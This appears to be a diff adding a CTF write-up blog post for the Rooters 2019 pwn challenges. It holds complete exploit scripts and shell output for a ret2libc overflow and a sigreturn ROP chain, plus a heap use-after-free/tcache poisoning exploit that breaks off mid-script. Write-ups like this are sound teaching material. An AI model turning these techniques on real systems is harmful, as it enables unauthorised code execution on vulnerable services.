@@ -1,0 +1,627 @@
+I"��<p>I played this CTF with the team <code class="highlighter-rouge">warlock_rootx</code>. The pwn challenges were pretty good, I solved all of them except for one.</p>
+
+<h4 id="challenges">Challenges</h4>
+
+<div class="toc-container">
+  <ul id="markdown-toc">
+    <li><a href="#baby-pwn" id="markdown-toc-h1-header">baby pwn</a>
+    </li>
+    <li><a href="#secure-rop" id="markdown-toc-h1-header">Secure ROP</a>
+    </li>
+    <li><a href="#user-administration" id="markdown-toc-h1-header">USER ADMINISTRATION</a>
+    </li>
+		<li><a href="#xsh" id="markdown-toc-h1-header">xsh</a>
+    </li>
+  </ul>
+</div>
+
+<h1 id="baby-pwn">baby pwn</h1>
+
+<h3 id="challenge"><strong>Challenge</strong></h3>
+
+<ul>
+  <li><strong>Category:</strong> pwn</li>
+  <li><strong>Points:</strong> 254</li>
+  <li><strong>Solves:</strong> 75</li>
+</ul>
+
+<blockquote>
+  <p>Mommy what is stack overflow?</p>
+
+  <p>nc 35.188.73.186 1111</p>
+
+  <p>Author: codacker</p>
+</blockquote>
+
+<h3 id="solution"><strong>Solution</strong></h3>
+
+<p>Glibc version is 2.27 which was found out by using the leak + niklasb’s libc database.</p>
+
+<p>This was a very simple ret2libc exploit with ASLR enabled. I won’t go into too much detail as there are already tons of writeups and tutorials on how to do a ret2libc attack. You may refer to my comments below for some explanation.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python2
+</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./vuln'</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./libc.so.6'</span><span class="p">)</span> <span class="c1"># libc-2.27 from Ubuntu Bionic
+#p = process('./vuln')
+</span><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'35.188.73.186'</span><span class="p">,</span> <span class="mi">1111</span><span class="p">)</span>
+
+<span class="c1"># Receive the initial text
+</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+
+<span class="c1"># Important addresses
+</span><span class="n">puts</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s">'puts'</span><span class="p">]</span>
+<span class="n">puts_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">'puts'</span><span class="p">]</span>
+<span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x401223</span> <span class="c1"># pop rdi; ret
+</span><span class="n">ret</span> <span class="o">=</span> <span class="mh">0x40101a</span> <span class="c1"># ret
+</span><span class="n">main</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'main'</span><span class="p">]</span>
+
+<span class="c1"># For an explanation of the need for the ret gadget, please check the
+# ROPEmporium Beginner's Guide under Common Pitfalls
+#------------------------------------------------------
+</span><span class="n">payload</span> <span class="o">=</span> <span class="s">'A'</span><span class="o">*</span><span class="mi">264</span> <span class="c1"># Overflow to return address
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span> <span class="c1"># This is needed here because of libc-2.27
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="c1"># Pop puts_got into rdi
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts</span><span class="p">)</span> <span class="c1"># Call puts(puts_got)
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">main</span><span class="p">)</span> <span class="c1"># Jump back to main
+</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+
+<span class="c1"># Get puts libc leak and calculate important offsets
+</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+<span class="n">leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
+<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">leak</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'puts'</span><span class="p">]</span>
+<span class="n">system</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
+<span class="n">bin_sh</span> <span class="o">=</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s">'/bin/sh'</span><span class="p">))</span>
+
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'Leak: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">leak</span><span class="p">))</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'Libc base: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'system: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system</span><span class="p">))</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'/bin/sh: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">))</span>
+
+<span class="c1"># Redo the exploit but call system('/bin/sh')
+</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s">'A'</span><span class="o">*</span><span class="mi">264</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vagrant@ubuntu-bionic:/ctf/pwn-and-re-challenges/rooters-2019/baby_pwn<span class="nv">$ </span>./exploit.py REMOTE
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/ctf/pwn-and-re-challenges/rooters-2019/baby_pwn/vuln'</span>
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE <span class="o">(</span>0x400000<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/ctf/pwn-and-re-challenges/rooters-2019/baby_pwn/libc.so.6'</span>
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+<span class="o">[</span>+] Opening connection to 35.188.73.186 on port 1111: Done
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Leak: 0x7f94461419c0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Libc base: 0x7f94460c1000
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> system: 0x7f9446110440
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> /bin/sh: 0x7f9446274e9a
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Switching to interactive mode
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<span class="se">\x</span>1a<span class="se">\x</span>10@<span class="nv">$ </span><span class="nb">ls
+</span>bin
+boot
+dev
+etc
+home
+lib
+lib64
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+<span class="nv">$ </span><span class="nb">cat</span> /home/<span class="k">*</span>/flag.txt
+rooters<span class="o">{</span>L0l_W3lc0m3_70_7h3_0f_Pwn1ng<span class="o">}</span>ctf
+<span class="err">$</span>
+</code></pre></div></div>
+
+<h1 id="secure-rop">Secure ROP</h1>
+
+<h3 id="challenge-1"><strong>Challenge</strong></h3>
+
+<ul>
+  <li><strong>Category:</strong> pwn</li>
+  <li><strong>Points:</strong> 462</li>
+  <li><strong>Solves:</strong> 32</li>
+</ul>
+
+<blockquote>
+  <p>Secure ROP anyone?</p>
+
+  <p>nc 146.148.108.204 4444</p>
+
+  <p>Author: codacker</p>
+</blockquote>
+
+<h3 id="solution-1"><strong>Solution</strong></h3>
+
+<p>Just a simple SROP (SigReturn Oriented Programming) challenge. I did two <code class="highlighter-rouge">rt_sigreturn</code> syscalls to solve it.</p>
+
+<ol>
+  <li>
+    <p>The first one moved the <code class="highlighter-rouge">rsp</code> and <code class="highlighter-rouge">rbp</code> into the bss segment to emulate a “stack” there. I then made a <code class="highlighter-rouge">read</code> syscall to read the string ‘/bin/sh\x00’ plus some addresses to jump to after the <code class="highlighter-rouge">read</code>. Since the stack is being emulated in the bss segment, any <code class="highlighter-rouge">ret</code> instruction will just check the value at <code class="highlighter-rouge">rsp</code> to find where to jump to. I use this to jump to a <code class="highlighter-rouge">pop rax; syscall</code> after the <code class="highlighter-rouge">read</code> syscall.</p>
+  </li>
+  <li>
+    <p>In the second <code class="highlighter-rouge">rt_sigreturn</code> syscall, I just do an <code class="highlighter-rouge">execve</code> syscall with the now existing ‘/bin/sh\x00’ string in memory.</p>
+  </li>
+</ol>
+
+<p>You may need to run the exploit remotely a couple of times. Doesn’t seem to be completely reliable due to network lag? It works perfectly locally.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python2
+</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./vuln'</span><span class="p">)</span>
+
+<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
+<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span> <span class="s">'new-window'</span><span class="p">]</span>
+
+<span class="k">def</span> <span class="nf">start</span><span class="p">():</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">args</span><span class="o">.</span><span class="n">REMOTE</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">process</span><span class="p">(</span><span class="s">'./vuln'</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="s">'146.148.108.204'</span><span class="p">,</span> <span class="mi">4444</span><span class="p">)</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
+<span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
+    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+
+<span class="c1"># Important addresses
+</span><span class="n">pop_rax</span> <span class="o">=</span> <span class="mh">0x401032</span> <span class="c1"># pop rax; syscall
+</span><span class="n">syscall</span> <span class="o">=</span> <span class="mh">0x401033</span> <span class="c1"># syscall; leave; ret
+</span><span class="n">rw</span> <span class="o">=</span> <span class="mh">0x402040</span> <span class="c1"># read-write section
+</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s">'A'</span><span class="o">*</span><span class="mi">136</span> <span class="c1"># overflow to return address
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rax</span><span class="p">)</span> <span class="c1"># pop rax; syscall
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xf</span><span class="p">)</span> <span class="c1"># make syscall number 15 for rt_sigreturn
+</span>
+<span class="c1"># Sigreturn frame
+</span><span class="n">frame</span> <span class="o">=</span> <span class="n">SigreturnFrame</span><span class="p">()</span>
+<span class="n">frame</span><span class="o">.</span><span class="n">rax</span> <span class="o">=</span> <span class="mi">0</span> <span class="c1"># Read syscall
+</span><span class="n">frame</span><span class="o">.</span><span class="n">rsp</span> <span class="o">=</span> <span class="n">rw</span><span class="o">+</span><span class="mi">8</span> <span class="c1"># move the stack pointer to the bss segment
+</span><span class="n">frame</span><span class="o">.</span><span class="n">rbp</span> <span class="o">=</span> <span class="n">rw</span><span class="o">+</span><span class="mh">0x60</span> <span class="c1"># Move the base pointerr to the bss segment
+</span><span class="n">frame</span><span class="o">.</span><span class="n">rdi</span> <span class="o">=</span> <span class="mi">0</span> <span class="c1"># Read from stdin
+</span><span class="n">frame</span><span class="o">.</span><span class="n">rsi</span> <span class="o">=</span> <span class="n">rw</span> <span class="c1"># Read into the read-write section
+</span><span class="n">frame</span><span class="o">.</span><span class="n">rdx</span> <span class="o">=</span> <span class="mh">0x400</span> <span class="c1"># Read 0x400 bytes
+</span><span class="n">frame</span><span class="o">.</span><span class="n">rip</span> <span class="o">=</span> <span class="n">syscall</span> <span class="c1"># jumps to the syscall; leave; ret gadget after syscall
+</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="nb">str</span><span class="p">(</span><span class="n">frame</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="c1"># Sleep to let the payload send (needed for remote)
+</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="c1"># Now we start our new payload in the bss segment
+# ------------------------------------
+</span><span class="n">payload</span> <span class="o">=</span> <span class="s">'/bin/sh</span><span class="se">\x00</span><span class="s">'</span> <span class="c1"># Input /bin/sh\x00 to use later
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="s">'A'</span><span class="o">*</span><span class="mi">96</span> <span class="c1"># Overwrite until return address in our "emulated" stack
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rax</span><span class="p">)</span> <span class="c1"># Jump to pop rax; syscall
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xf</span><span class="p">)</span> <span class="c1"># Make syscall number 15 for rt_sigreturn
+</span>
+<span class="c1"># Call execve now
+</span><span class="n">frame</span> <span class="o">=</span> <span class="n">SigreturnFrame</span><span class="p">()</span>
+<span class="n">frame</span><span class="o">.</span><span class="n">rax</span> <span class="o">=</span> <span class="mi">59</span> <span class="c1"># execve
+</span><span class="n">frame</span><span class="o">.</span><span class="n">rdi</span> <span class="o">=</span> <span class="n">rw</span> <span class="c1"># addr of /bin/sh\x00
+</span><span class="n">frame</span><span class="o">.</span><span class="n">rsi</span> <span class="o">=</span> <span class="mi">0</span> <span class="c1"># needs to be null
+</span><span class="n">frame</span><span class="o">.</span><span class="n">rdx</span> <span class="o">=</span> <span class="mi">0</span> <span class="c1"># needs to be null
+</span><span class="n">frame</span><span class="o">.</span><span class="n">rip</span> <span class="o">=</span> <span class="n">syscall</span> <span class="c1"># Jump to syscall;
+</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="nb">str</span><span class="p">(</span><span class="n">frame</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vagrant@ubuntu-bionic:/ctf/pwn-and-re-challenges/rooters-2019/secure_rop<span class="nv">$ </span>./exploit.py REMOTE
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/ctf/pwn-and-re-challenges/rooters-2019/secure_rop/vuln'</span>
+    Arch:     amd64-64-little
+    RELRO:    No RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE <span class="o">(</span>0x400000<span class="o">)</span>
+<span class="o">[</span>+] Opening connection to 146.148.108.204 on port 4444: Done
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Switching to interactive mode
+<span class="nv">$ </span><span class="nb">ls
+</span>bin
+boot
+dev
+etc
+home
+lib
+lib64
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+<span class="nv">$ </span><span class="nb">cat</span> /home/<span class="k">*</span>/flag.txt
+rooters<span class="o">{</span>i_l0v3_5r0p<span class="o">}</span>ctf
+<span class="err">$</span>
+</code></pre></div></div>
+
+<h1 id="user-administration">USER ADMINISTRATION</h1>
+
+<h3 id="challenge-2"><strong>Challenge</strong></h3>
+
+<ul>
+  <li><strong>Category:</strong> pwn</li>
+  <li><strong>Points:</strong> 493</li>
+  <li><strong>Solves:</strong> 15</li>
+</ul>
+
+<blockquote>
+  <p>We created a super secure user administration system can you guys help us find the unknown vulnerability.</p>
+
+  <p>nc 34.69.116.108 3333</p>
+
+  <p>Author: codacker</p>
+</blockquote>
+
+<h3 id="solution-2"><strong>Solution</strong></h3>
+
+<p>Glibc version for this challenge is libc 2.27.</p>
+
+<p>To be honest, I don’t really know how I came up with the solution for this challenge. I trial and errored my way to getting the leak. After that, it was very easy.</p>
+
+<p>The program has all security mitigations enabled except Full RELRO:</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vagrant@ubuntu-bionic:/ctf/pwn-and-re-challenges/rooters-2019/user_admin<span class="nv">$ </span>checksec vuln
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/ctf/pwn-and-re-challenges/rooters-2019/user_admin/vuln'</span>
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+</code></pre></div></div>
+
+<p>It lets you create a user where you type in the user’s name and age. This user is malloc’d and a pointer to the user is stored in a global variable.</p>
+
+<p>It lets you edit the user’s name and age.</p>
+
+<p>It lets you delete the user, which simply frees the user but doesn’t NULL out the global variable, thus UAF.</p>
+
+<p>It lets you send a message to an admin, which will again just allocate a new message on the heap.</p>
+
+<p>All allocations are pretty much done with <code class="highlighter-rouge">strdup</code>, except when creating a user.</p>
+
+<p>I found out that by doing the following, we can get a leak of <code class="highlighter-rouge">_IO_str_jumps_</code>:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Initial user
+</span><span class="n">create</span><span class="p">(</span><span class="s">'A'</span><span class="o">*</span><span class="mi">8</span><span class="p">,</span> <span class="mi">15</span><span class="p">)</span>
+
+<span class="c1"># Double free
+</span><span class="n">free</span><span class="p">()</span>
+<span class="n">free</span><span class="p">()</span>
+
+<span class="c1"># Change LSB of fd to 0x80
+</span><span class="n">edit</span><span class="p">(</span><span class="s">'</span><span class="se">\x80</span><span class="s">'</span><span class="p">,</span> <span class="mi">15</span><span class="p">)</span>
+
+<span class="n">create</span><span class="p">(</span><span class="s">'A'</span><span class="p">,</span> <span class="mi">15</span><span class="p">)</span>
+<span class="n">message</span><span class="p">(</span><span class="s">'A'</span><span class="o">*</span><span class="mh">0x30</span><span class="p">)</span>
+
+<span class="n">leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'Saving'</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)[</span><span class="mi">2</span><span class="p">][</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
+<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">leak</span> <span class="o">-</span> <span class="mh">0x3e82a0</span>
+<span class="n">system</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
+<span class="n">free_hook</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'__free_hook'</span><span class="p">]</span>
+
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'Leak: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">leak</span><span class="p">))</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'Libc base: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'system: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system</span><span class="p">))</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'__free_hook: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">free_hook</span><span class="p">))</span>
+</code></pre></div></div>
+
+<p>After that it was just a tcache poisoning attack to get a chunk on <code class="highlighter-rouge">__free_hook</code> and overwrite it with <code class="highlighter-rouge">system</code>. Then, calling free on a chunk that has its first 8 bytes set to ‘/bin/sh\x00’ gives a shell.</p>
+
+<p>Again there really isn’t much to explain regarding the leak. I just viewed the heap a couple times, did some trial and error with creating messages and messing around with the LSB of the fd pointer after the double free, and for some reason the last <code class="highlighter-rouge">message('A'*0x30)</code> puts a libc address into the heap. No idea why, but I’ll take what I can get.</p>
+
+<p>Exploit doesn’t seem to be completely reliable remotely, but works perfectly fine locally. Might have to run it a couple times to get it to work remotely.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python2
+</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./vuln'</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./libc.so.6'</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">get_base_address</span><span class="p">(</span><span class="n">proc</span><span class="p">):</span>
+  <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="s">"/proc/{}/maps"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">proc</span><span class="o">.</span><span class="n">pid</span><span class="p">),</span> <span class="s">'rb'</span><span class="p">)</span><span class="o">.</span><span class="n">readlines</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'-'</span><span class="p">)[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">debug</span><span class="p">(</span><span class="n">breakpoints</span><span class="p">):</span>
+  <span class="n">script</span> <span class="o">=</span> <span class="s">""</span>
+  <span class="n">PIE</span> <span class="o">=</span> <span class="n">get_base_address</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
+  <span class="k">for</span> <span class="n">bp</span> <span class="ow">in</span> <span class="n">breakpoints</span><span class="p">:</span>
+    <span class="n">script</span> <span class="o">+=</span> <span class="s">"b *0x</span><span class="si">%</span><span class="s">x</span><span class="se">\n</span><span class="s">"</span><span class="o">%</span><span class="p">(</span><span class="n">PIE</span><span class="o">+</span><span class="n">bp</span><span class="p">)</span>
+  <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="n">gdbscript</span><span class="o">=</span><span class="n">script</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">create</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">age</span><span class="p">):</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">': '</span><span class="p">,</span> <span class="s">'0'</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">': '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">age</span><span class="p">))</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">': '</span><span class="p">,</span> <span class="n">username</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">age</span><span class="p">):</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">': '</span><span class="p">,</span> <span class="s">'1'</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">': '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">age</span><span class="p">))</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">': '</span><span class="p">,</span> <span class="n">username</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">free</span><span class="p">():</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">': '</span><span class="p">,</span> <span class="s">'2'</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">message</span><span class="p">(</span><span class="n">msg</span><span class="p">):</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">': '</span><span class="p">,</span> <span class="s">'3'</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">': '</span><span class="p">,</span> <span class="n">msg</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">start</span><span class="p">():</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">args</span><span class="o">.</span><span class="n">REMOTE</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">process</span><span class="p">(</span><span class="s">'./vuln'</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="s">'34.69.116.108'</span><span class="p">,</span> <span class="mi">3333</span><span class="p">)</span>
+
+<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span> <span class="s">'new-window'</span><span class="p">]</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
+<span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
+    <span class="n">debug</span><span class="p">([])</span>
+
+<span class="c1"># Initial user
+</span><span class="n">create</span><span class="p">(</span><span class="s">'A'</span><span class="o">*</span><span class="mi">8</span><span class="p">,</span> <span class="mi">15</span><span class="p">)</span>
+
+<span class="c1"># Double free
+</span><span class="n">free</span><span class="p">()</span>
+<span class="n">free</span><span class="p">()</span>
+
+<span class="c1"># Change LSB of fd to 0x80
+</span><span class="n">edit</span><span class="p">(</span><span class="s">'</span><span class="se">\x80</span><span class="s">'</span><span class="p">,</span> <span class="mi">15</span><span class="p">)</span>
+
+<span class="n">create</span><span class="p">(</span><span class="s">'A'</span><span class="p">,</span> <span class="mi">15</span><span class="p">)</span>
+<span class="n">message</span><span class="p">(</span><span class="s">'A'</span><span class="o">*</span><span class="mh">0x30</span><span class="p">)</span>
+
